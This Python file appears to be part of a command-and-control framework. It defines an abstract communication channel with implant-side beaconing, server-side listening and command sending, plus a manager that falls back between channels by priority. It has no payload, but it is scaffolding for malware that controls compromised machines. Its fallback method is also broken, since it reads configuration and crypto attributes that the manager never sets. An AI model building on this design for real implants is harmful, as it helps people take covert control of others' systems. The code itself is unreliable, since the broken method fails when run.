from abc import ABC, abstractmethod
import asyncio
import os

class BaseChannel(ABC):
    def __init__(self, config: dict):
        self.config = config
        self.crypto = None
        self.available = False
        self.loop = asyncio.get_event_loop()
        
    def set_crypto(self, crypto_handler):
        self.crypto = crypto_handler
    
    @abstractmethod
    async def init(self) -> bool:
        """Async init"""
        pass
    
    @abstractmethod
    async def is_available(self) -> bool:
        pass
    
    @abstractmethod
    async def send_command(self, command_data: dict, task_id: str) -> bool:
        pass
    
    @abstractmethod
    async def receive_response(self, task_id: str) -> dict:
        pass
    
    @abstractmethod
    async def listen(self, callback: callable) -> None:  # New: Async listener for server
        """Server-side: Listen loop, call callback on data"""
        pass
    
    async def beacon(self) -> bool:  # Implant-side, but async for consistency
        pass
    
    def teardown(self):
        pass

class ChannelManager:
    def __init__(self):
        self.channels = {}
        self.active_channel = None
        self.fallback_order = []
        
    def register_channel(self, name: str, channel_class, priority: int = 0):
        self.channels[name] = {'class': channel_class, 'priority': priority}
        self.fallback_order.append(name)
        self.fallback_order.sort(key=lambda x: self.channels[x]['priority'])
    
    def create_channel(self, name: str, config: dict, crypto_handler):
        if name not in self.channels:
            raise ValueError(f"Channel {name} not registered")
        channel = self.channels[name]['class'](config)
        channel.set_crypto(crypto_handler)
        return channel
    
    async def get_available_channel(self):
        for name in self.fallback_order:
            channel = self.create_channel(name, self.config, self.crypto)
            if await channel.is_available():
                self.active_channel = channel
                return channel
        return None
